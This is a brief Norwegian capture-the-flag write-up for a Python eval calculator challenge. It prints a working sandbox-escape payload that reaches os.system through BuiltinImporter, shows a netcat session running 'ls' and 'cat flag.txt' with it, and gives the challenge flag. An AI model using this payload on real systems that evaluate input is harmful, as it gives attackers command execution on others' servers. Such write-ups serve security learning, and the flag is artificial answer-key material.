Denne typen `eval`-oppgaver i Python har jeg vært borti før. Googlet litt og fant en payload her: https://netsec.expert/posts/breaking-python3-eval-protections/

Payload:
```python
[x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("echo pwned")
```

Testing:

```bash
$ nc ctf.uiactf.no 4003
Velkommen til min enkle kalkulator!
Skriv inn det du vil beregne etter '>' og du får et svar!
> math.pi
3.141592653589793
> math.sqrt(64)
8.0
> [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("echo pwned")
pwned
0
> [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("ls")
calculator.py
flag.txt
0
> [x for x in  [].__class__.__base__.__subclasses__() if x.__name__ == 'BuiltinImporter'][0]().load_module('os').system("cat flag.txt")
UIACTF{eval er skumle saker!}
0
>
```

## Flagg

`UIACTF{eval er skumle saker!}`
